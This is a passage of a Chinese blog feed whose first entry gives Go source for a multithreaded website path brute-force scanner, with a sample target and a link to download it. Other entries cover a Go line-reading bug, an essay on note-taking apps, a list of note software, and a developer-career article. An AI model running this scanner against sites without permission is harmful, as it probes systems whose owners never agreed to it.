class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"bufio"</span></div><div class="line">	<span class="string">"flag"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"io/ioutil"</span></div><div class="line">	<span class="string">"net/http"</span></div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"sync"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">var</span> urls <span class="keyword">chan</span> <span class="keyword">string</span></div><div class="line"><span class="keyword">var</span> no404URL = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</div><div class="line"><span class="keyword">var</span> wg sync.WaitGroup <span class="comment">//等待goroutine完成</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line"></div><div class="line">	<span class="keyword">var</span> baseURL <span class="keyword">string</span></div><div class="line">	<span class="keyword">var</span> dicPath <span class="keyword">string</span></div><div class="line">	<span class="keyword">var</span> threadCount <span class="keyword">int</span></div><div class="line">	flag.StringVar(&amp;baseURL, <span class="string">"u"</span>, <span class="string">"https://www.baidu.com"</span>, <span class="string">"website which you want to burst"</span>)</div><div class="line">	flag.StringVar(&amp;dicPath, <span class="string">"d"</span>, <span class="string">"asp.txt"</span>, <span class="string">"dic which you want to use"</span>)</div><div class="line">	flag.IntVar(&amp;threadCount, <span class="string">"t"</span>, <span class="number">5</span>, <span class="string">"number of Thread"</span>)</div><div class="line">	flag.Parse()</div><div class="line"></div><div class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(os.Args) == <span class="number">1</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"------------------------------------"</span>)</div><div class="line">		fmt.Println(<span class="string">" Author      |       Akkuamn"</span>)</div><div class="line">		fmt.Println(<span class="string">"------------------------------------"</span>)</div><div class="line">		fmt.Println(<span class="string">" Update-v1.0 |      2017-02-07"</span>)</div><div class="line">		fmt.Println(<span class="string">"-------------------------------------"</span>)</div><div class="line">		fmt.Printf(<span class="string">"\nUsage : \n\tExample : %s -u=https://www.baidu.com -d=asp.txt -t=5\n\n"</span>, os.Args[<span class="number">0</span>])</div><div class="line">		fmt.Printf(<span class="string">"View more help via %s -h\n\n"</span>, os.Args[<span class="number">0</span>])</div><div class="line">		listDic(<span class="string">"dic"</span>)</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		dicPath = <span class="string">"./dic/"</span> + dicPath</div><div class="line">		start(baseURL, dicPath, threadCount)</div><div class="line">		wg.Wait() <span class="comment">//等待goroutine完成</span></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">start</span><span class="params">(baseURL <span class="keyword">string</span>, dicPath <span class="keyword">string</span>, threadCount <span class="keyword">int</span>)</span></span> &#123;</div><div class="line"></div><div class="line">	dicFile, dicError := os.OpenFile(dicPath, os.O_RDONLY, <span class="number">0</span>)</div><div class="line">	<span class="keyword">if</span> dicError != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Printf(<span class="string">"\nOpenFile Error:文件打开出错，请检查字典文件是否存在，或文件名是否准确\n"</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">defer</span> dicFile.Close()</div><div class="line"></div><div class="line">	<span class="comment">//把处理后的需要爆破的url全部传到信道urls</span></div><div class="line">	ReturnBurstURL(dicFile, baseURL)</div><div class="line"></div><div class="line">	<span class="comment">//单独开goroutine从信道no404URL取数据写入文件</span></div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">		resultTxt, err := os.OpenFile(<span class="string">"result.txt"</span>, os.O_CREATE|os.O_TRUNC|os.O_RDWR, <span class="number">0660</span>)</div><div class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Println(<span class="string">"OpenFile Error:"</span> + err.Error())</div><div class="line">		&#125;</div><div class="line">		resultWriter := bufio.NewWriter(resultTxt)</div><div class="line">		<span class="keyword">defer</span> resultTxt.Close()</div><div class="line">		<span class="keyword">for</span> &#123;</div><div class="line">			_, err = resultWriter.WriteString(&lt;-no404URL)</div><div class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">				fmt.Println(<span class="string">"resultWriter Error:"</span> + err.Error())</div><div class="line">			&#125;</div><div class="line">			resultWriter.Flush()</div><div class="line">		&#125;</div><div class="line">	&#125;()</div><div class="line"></div><div class="line">	<span class="comment">//并发访问网址并将状态码不为404的网址加入信道no404URL</span></div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; threadCount; i++ &#123;</div><div class="line">		wg.Add(<span class="number">1</span>)</div><div class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</div><div class="line">			<span class="keyword">for</span> <span class="built_in">len</span>(urls) &gt; <span class="number">0</span> &#123;</div><div class="line">				url := &lt;-urls</div><div class="line">				status := HTTPStatus(url)</div><div class="line">				fmt.Printf(<span class="string">"[%d]%s-----%s\n"</span>, i, status, url)</div><div class="line">				<span class="keyword">if</span> status != <span class="string">"404 Not Found"</span> &#123;</div><div class="line">					no404URL &lt;- status + <span class="string">"-----"</span> + url + <span class="string">"\n"</span></div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			wg.Done()</div><div class="line">		&#125;(i)</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//返回HTTP访问状态码</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">HTTPStatus</span><span class="params">(url <span class="keyword">string</span>)</span> <span class="params">(status <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	client := http.DefaultClient</div><div class="line">	reqest, err := http.NewRequest(<span class="string">"HEAD"</span>, url, <span class="literal">nil</span>)</div><div class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</div><div class="line">		reqest.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"</span>)</div><div class="line">		reqest.Header.Set(<span class="string">"Accept"</span>, <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>)</div><div class="line">		response, err1 := client.Do(reqest)</div><div class="line">		<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Println(<span class="string">"HTTPRequest Error:"</span> + err1.Error())</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">defer</span> response.Body.Close()</div><div class="line">		<span class="keyword">return</span> response.Status</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"NewRequest Error:"</span> + err.Error())</div><div class="line">		<span class="keyword">return</span> <span class="string">"400 Bad Request"</span></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//把处理后的需要爆破的url全部传到信道urls</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> urlList []<span class="keyword">string</span></div><div class="line">	allURLTxt := bufio.NewScanner(fURL)</div><div class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</div><div class="line">		newurl := baseurl + <span class="string">"/"</span> + allURLTxt.Text()</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">	&#125;</div><div class="line">	urls = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="built_in">len</span>(urlList))</div><div class="line">	<span class="keyword">for</span> _, url := <span class="keyword">range</span> urlList &#123;</div><div class="line">		urls &lt;- url</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//罗列出可用字典</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">listDic</span><span class="params">(dicDir <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	dirList, err := ioutil.ReadDir(dicDir)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"ReadDir Error : "</span> + err.Error() + <span class="string">"\n"</span>)</div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"Dic you can select : "</span>)</div><div class="line">	<span class="keyword">for</span> _, file := <span class="keyword">range</span> dirList &#123;</div><div class="line">		fmt.Printf(<span class="string">"    %s\n"</span>, file.Name())</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>只编译了win平台下的，如果有需要可以自行编译</p>
<p><strong><a href="http://pan.baidu.com/s/1c2BYT8k" target="_blank" rel="external">源码及字典及win程序</a></strong><br><strong>密码: g1gd</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍&lt;/p&gt;
&lt;p&gt;先放张图&lt;img src=&quot;https://ooo.0o0.ooo/2017/03/04/58ba4e8c66d38.gif&quot; alt=&quot;演示1.gif&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://akkuman.coding.me/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://akkuman.coding.me/tags/Golang/"/>
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Golang踩坑录 两种方式来读取文件一行所导致的问题</title>
    <link href="http://akkuman.coding.me/2017/02/04/Golang%E8%B8%A9%E5%9D%91%E5%BD%95-%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%B8%80%E8%A1%8C%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98.html"/>
    <id>http://akkuman.coding.me/2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题.html</id>
    <published>2017-02-04T14:55:15.000Z</published>
    <updated>2017-03-03T14:13:58.822Z</updated>
    
    <content type="html"><![CDATA[<p>前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题<br>我要做的东西是网站路径爆破<br>所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题</p>
<a id="more"></a>
<p>下面是一个小片段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">400 Bad Request-----http://www.xxx.com/channel.asp</div><div class="line">400 Bad Request-----http://www.xxx.com/index.asp</div><div class="line">404 Not Found-----http://www.xxx.com/admin.asp</div></pre></td></tr></table></figure></p>
<p>程序本身并没有错误，但是运行结果就比较怪了<br>Bad Request?<br>这并不是我要说的重点，我发现的问题是，除了最后一个地址，前面所有的地址都会显示位400 Bad Request<br>经过几轮测试，我觉得应该是网址拼接上出了问题</p>
<p>我的拼接函数是这样<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewReader(fURL)</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		urlpath, readerError := allURLTxt.ReadString(<span class="string">'\n'</span>)</div><div class="line">		newurl := baseurl + strings.Replace(urlpath, <span class="string">"\n"</span>, <span class="string">""</span>, <span class="number">-1</span>)</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">		<span class="keyword">if</span> readerError == io.EOF &#123;</div><div class="line">			fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">			<span class="keyword">return</span> urlList</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我把取一行的方式换成bufio.NewScanner就正常了<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewScanner(fURL)</div><div class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</div><div class="line">		newurl := baseurl + allURLTxt.Text()</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">	<span class="keyword">return</span> urlList</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>网上读取文件一行很多人写的文章是第一种方法，但是我也不知道什么问题导致这种情况的发生<br>我特地去查了查api文档<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewReader</span><span class="params">(rd io.Reader)</span> *<span class="title">Reader</span></span></div><div class="line">//<span class="title">NewReader</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Reader</span> <span class="title">whose</span> <span class="title">buffer</span> <span class="title">has</span> <span class="title">the</span> <span class="title">default</span> <span class="title">size</span>. </div><div class="line"><span class="title">func</span> <span class="params">(b *Reader)</span> <span class="title">ReadString</span><span class="params">(delim <span class="keyword">byte</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></div><div class="line">//<span class="title">ReadString</span> <span class="title">reads</span> <span class="title">until</span> <span class="title">the</span> <span class="title">first</span> <span class="title">occurrence</span> <span class="title">of</span> <span class="title">delim</span> <span class="title">in</span> <span class="title">the</span> <span class="title">input</span>, <span class="title">returning</span> <span class="title">a</span> <span class="title">string</span> <span class="title">containing</span> <span class="title">the</span> <span class="title">data</span> <span class="title">up</span> <span class="title">to</span> <span class="title">and</span> <span class="title">including</span> <span class="title">the</span> <span class="title">delimiter</span>. <span class="title">If</span> <span class="title">ReadString</span> <span class="title">encounters</span> <span class="title">an</span> <span class="title">error</span> <span class="title">before</span> <span class="title">finding</span> <span class="title">a</span> <span class="title">delimiter</span>, <span class="title">it</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">data</span> <span class="title">read</span> <span class="title">before</span> <span class="title">the</span> <span class="title">error</span> <span class="title">and</span> <span class="title">the</span> <span class="title">error</span> <span class="title">itself</span> <span class="params">(often io.EOF)</span>. <span class="title">ReadString</span> <span class="title">returns</span> <span class="title">err</span> != <span class="title">nil</span> <span class="title">if</span> <span class="title">and</span> <span class="title">only</span> <span class="title">if</span> <span class="title">the</span> <span class="title">returned</span> <span class="title">data</span> <span class="title">does</span> <span class="title">not</span> <span class="title">end</span> <span class="title">in</span> <span class="title">delim</span>. <span class="title">For</span> <span class="title">simple</span> <span class="title">uses</span>, <span class="title">a</span> <span class="title">Scanner</span> <span class="title">may</span> <span class="title">be</span> <span class="title">more</span> <span class="title">convenient</span>. </div><div class="line"><span class="title">func</span> <span class="title">NewScanner</span><span class="params">(r io.Reader)</span> *<span class="title">Scanner</span></div><div class="line">//<span class="title">NewScanner</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">read</span> <span class="title">from</span> <span class="title">r</span>. <span class="title">The</span> <span class="title">split</span> <span class="title">function</span> <span class="title">defaults</span> <span class="title">to</span> <span class="title">ScanLines</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Scan</span><span class="params">()</span> <span class="title">bool</span></div><div class="line">//<span class="title">Scan</span> <span class="title">advances</span> <span class="title">the</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">the</span> <span class="title">next</span> <span class="title">token</span>, <span class="title">which</span> <span class="title">will</span> <span class="title">then</span> <span class="title">be</span> <span class="title">available</span> <span class="title">through</span> <span class="title">the</span> <span class="title">Bytes</span> <span class="title">or</span> <span class="title">Text</span> <span class="title">method</span>. <span class="title">It</span> <span class="title">returns</span> <span class="title">false</span> <span class="title">when</span> <span class="title">the</span> <span class="title">scan</span> <span class="title">stops</span>, <span class="title">either</span> <span class="title">by</span> <span class="title">reaching</span> <span class="title">the</span> <span class="title">end</span> <span class="title">of</span> <span class="title">the</span> <span class="title">input</span> <span class="title">or</span> <span class="title">an</span> <span class="title">error</span>. <span class="title">After</span> <span class="title">Scan</span> <span class="title">returns</span> <span class="title">false</span>, <span class="title">the</span> <span class="title">Err</span> <span class="title">method</span> <span class="title">will</span> <span class="title">return</span> <span class="title">any</span> <span class="title">error</span> <span class="title">that</span> <span class="title">occurred</span> <span class="title">during</span> <span class="title">scanning</span>, <span class="title">except</span> <span class="title">that</span> <span class="title">if</span> <span class="title">it</span> <span class="title">was</span> <span class="title">io</span>.<span class="title">EOF</span>, <span class="title">Err</span> <span class="title">will</span> <span class="title">return</span> <span class="title">nil</span>. <span class="title">Scan</span> <span class="title">panics</span> <span class="title">if</span> <span class="title">the</span> <span class="title">split</span> <span class="title">function</span> <span class="title">returns</span> 100 <span class="title">empty</span> <span class="title">tokens</span> <span class="title">without</span> <span class="title">advancing</span> <span class="title">the</span> <span class="title">input</span>. <span class="title">This</span> <span class="title">is</span> <span class="title">a</span> <span class="title">common</span> <span class="title">error</span> <span class="title">mode</span> <span class="title">for</span> <span class="title">scanners</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Text</span><span class="params">()</span> <span class="title">string</span></div><div class="line">//<span class="title">Text</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">most</span> <span class="title">recent</span> <span class="title">token</span> <span class="title">generated</span> <span class="title">by</span> <span class="title">a</span> <span class="title">call</span> <span class="title">to</span> <span class="title">Scan</span> <span class="title">as</span> <span class="title">a</span> <span class="title">newly</span> <span class="title">allocated</span> <span class="title">string</span> <span class="title">holding</span> <span class="title">its</span> <span class="title">bytes</span>.</div></pre></td></tr></table></figure></p>
<p>按照上面的api文档，这两个的区别就是两者在返回string的时候，一个是数据+分隔符，一个是一行的数据，不带分隔符<br>虽说我第一种方法也用strings.Replace方法把”\n”替换成了””空字符，但是可能还是有点奇奇怪怪的东西</p>
<p><em>转载请注明出处</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题&lt;br&gt;我要做的东西是网站路径爆破&lt;br&gt;所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题&lt;/p&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://akkuman.coding.me/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://akkuman.coding.me/tags/Golang/"/>
    
      <category term="问题解决" scheme="http://akkuman.coding.me/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>笔记带给我们是真实的知识增长么？你需要好好考虑了</title>
    <link href="http://akkuman.coding.me/2017/01/21/%E7%AC%94%E8%AE%B0%E5%B8%A6%E7%BB%99%E6%88%91%E4%BB%AC%E6%98%AF%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E5%A2%9E%E9%95%BF%E4%B9%88%EF%BC%9F%E4%BD%A0%E9%9C%80%E8%A6%81%E5%A5%BD%E5%A5%BD%E8%80%83%E8%99%91%E4%BA%86.html"/>
    <id>http://akkuman.coding.me/2017/01/21/笔记带给我们是真实的知识增长么？你需要好好考虑了.html</id>
    <published>2017-01-21T08:54:38.000Z</published>
    <updated>2017-03-03T15:40:10.079Z</updated>
    
    <content type="html"><![CDATA[<p>我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。<br><a id="more"></a><br>其实滥用或者过分依赖这些笔记软件，最大的坏处是产生了知识增长的错觉。剪藏一篇机器学习的长文，就以为自己的知识增长了，其实只扫了一眼前言。 下载了一系列新框架的开发教程，三分钟热度把开发环境搭建完，跟着第一章跑了个hello world就弃坑了，但还是在欺骗自己，觉得自己已经掌握了，最不济那些教程已经被我收到硬盘里了，要用的时候再翻出来学嘛。而且，这种廉价的获得知识的错觉，带来的成就感比真的花时间去学习还要强，甚至会形成“要开工了-&gt;先了解下业界动态，去各大论坛微博逛一圈-&gt;哇，又有这么多新教程/技巧/开源库，看不过来，先保存到笔记软件 -&gt; 啊，不知不觉居然花了一个小时，不过我又不是打游戏看电影，是在收集知识，对自己还是有帮助的，不算虚度时光吧 -&gt; 继续开工，嗯？这个问题好像看到过更好的解决办法，要不要试着优化下？算了算了，反正办法在笔记里存着，以后有时间再重构吧 -&gt;…”</p>
<p>那几个月里我一直就陷在这样的循环里，同时还沾沾自喜于自己的“努力”而不自觉。直到某天，有个面试者坐到我面前时，我惊讶于他面谈时对各类业界动态新框架新技术口若悬河，但是实际的笔试题目却做得惨不忍睹，有些基础概念题都直接留白。我试探性地问了下原因，结果他特别诚恳地看着我说，这些问题的答案都存在他包里的笔记本电脑里，只要他想，分分钟就能搜出来。</p>
<p>当时我下意识地反问了一句：“那谁不会啊？”</p>
<p>说完我自己都惊了一下。</p>
<p>那天之后，我很少再去碰那些笔记软件了。第二大脑什么的都是骗人的，在我得老年痴呆之前，应该不会特别依赖它们。曾经我一个月要从各大技术论坛微博twitter上收集几十篇教程，上百篇技术长文，真正看完的，不到五篇。之后我发现，把产生这些知识的源头掐掉，统统加到127.0.0.1里去，节省下的时间认认真真读几本经典纸质书，跟着官方文档走一遍教程，不收集，多动手多思考，技术长进比之前快得多。实际做项目的时候碰到解决不了的问题怎么办？直接开google去搜呗。根本没必要去浪费时间维护一个私人的知识库。</p>
<p>在人类数千年漫长的文明史中，收藏本来是一件相当奢侈，大量耗费金钱、时间、精力的事情。但到了互联网的时代，这一切被简化成了点点鼠标就能完成的美事。或许因为盗版盛行的原因，它几乎已经是免费的，但它对于个体时间精力的耗费，却始终没有变化。而且，躺在硬盘里的资源们，就像王阳明的花一样，你未看它时，它与你同归于寂，一点关系都没有。</p>
<p>《银河英雄传说》里杨威利说过一句名言：“如果你不记得了，那说明它不重要。” 或许可以再补充一句，“如果你看不完，那就没必要看完。” 大概就是这样，不知不觉写了这么多，与所有现在或曾经的互联网资源收集成瘾症患者共勉。</p>
<p><strong>转自<a href="https://www.v2ex.com/amp/t/191507" target="_blank" rel="external">V2EX</a>一位v友的回答</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。&lt;br&gt;
    
    </summary>
    
      <category term="生活" scheme="http://akkuman.coding.me/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>PKM（个人知识管理）类软件收集(偶尔更新列表)</title>
    <link href="http://akkuman.coding.me/2017/01/21/PKM%EF%BC%88%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%EF%BC%89%E7%B1%BB%E8%BD%AF%E4%BB%B6-%E5%81%B6%E5%B0%94%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8.html"/>
    <id>http://akkuman.coding.me/2017/01/21/PKM（个人知识管理）类软件-偶尔更新列表.html</id>
    <published>2017-01-21T06:22:41.000Z</published>
    <updated>2017-03-03T15:40:28.127Z</updated>
    
    <content type="html"><![CDATA[<p>evernote(印象笔记)</p>
<p>Wiz<br><a id="more"></a><br>有道云</p>
<p>麦库</p>
<p>leanote</p>
<p>GoogleKeep</p>
<p>OneNote</p>
<p>SimpleNote(wp家的，免费)</p>
<p>pocket(稍后读的软件，同类的还有Instapaper，国内的收趣)</p>
<p>MyBase</p>
<p>RaysNote(v友开发)</p>
<p>CintaNotes</p>
<p><a href="https://jitaku.io" target="_blank" rel="external">https://jitaku.io</a></p>
<p><strong>开源</strong></p>
<p>Gitit-Bigger</p>
<p>Laverna</p>
<p>paperwork</p>
<p>DokuWiki</p>
<p>leanote</p>
<p>PermaNote</p>
<p>CherryTree</p>
<p>BrainStorm</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;evernote(印象笔记)&lt;/p&gt;
&lt;p&gt;Wiz&lt;br&gt;
    
    </summary>
    
      <category term="推荐向" scheme="http://akkuman.coding.me/categories/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
    
      <category term="推荐向" scheme="http://akkuman.coding.me/tags/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
      <category term="软件" scheme="http://akkuman.coding.me/tags/%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>web高级开发的成长之路</title>
    <link href="http://akkuman.coding.me/2017/01/20/web%E9%AB%98%E7%BA%A7%E5%BC%80%E5%8F%91%E7%9A%84%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF.html"/>
    <id>http://akkuman.coding.me/2017/01/20/web高级开发的成长之路.html</id>
    <published>2017-01-20T14:53:41.000Z</published>
    <updated>2017-03-03T15:39:54.598Z</updated>
    
    <content type="html"><![CDATA[<p>读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。</p>
<p><strong>正文如下：</strong><br><a id="more"></a><br>本人也是coding很多年，虽然很失败，但也总算有点失败的心得，不过我在中国，大多数程序员都是像我一样，在一直走着弯路。如果想成为一个架构师，就必须走正确的路，否则离目标越来越远，正在辛苦工作的程序员们，你们有没有下面几种感觉？</p>
<p>　　一、我的工作就是按时完成领导交给我的任务，至于代码写的怎样，知道有改进空间，但没时间去改进，关键是领导也不给时间啊。</p>
<p>　　二、我发现我的水平总是跟不上技术的进步，有太多想学的东西要学，jQuery用的人最近比较多啊，听说最近MVC比较火，还有LINQ，听说微软又有Silverlight了……</p>
<p>　　三、我发现虽然我工作几年了，除了不停的coding，Ctrl+C和Ctrl+V更熟练了，但编码水平并没有提高，还是一个普通程序员，但有人已经做到架构师了。</p>
<p>　　四、工作好几年了，想跳槽换个工作，结果面试的考官都问了一些什么数据结构，什么垃圾回收，什么设计模式之类的东西，虽然看过，但是平时用不着，看了也忘记了，回答不上来，结果考官说我基础太差。。。</p>
<p>　　有没有，如果没有，接下来就不用看了，你一定是大拿了，或者已经明白其中之道了，呵呵。</p>
<p>　　如果有，恭喜你，你进入学习误区了，如果想在技术上前进的话，就不能一直的coding，为了完成需求而工作，必须在coding的同时，让我们的思维，水平也在不停的提高。</p>
<p>　　写代码要经历下面几个阶段。</p>
<p>　　一 、你必须学习面向对象的基础知识，如果连这个都忘了，那你的编程之路注定是在做原始初级的重复！</p>
<p>　　很多程序员都知道类、方法、抽象类、接口等概念，但是为什么要面向对象，好处在哪里，要解决什么问题？只是明白概念，就是表达不清楚，然后在实 际工作中也用不上，过了一段时间，面向对象的东西又模糊了，结果是大多数程序员用着面向对象的语言做着面向过程的工作，因此要学习面向对象，首先应该明白 面向对象的目的是什么？</p>
<p>　　面向对象的目的是什么？</p>
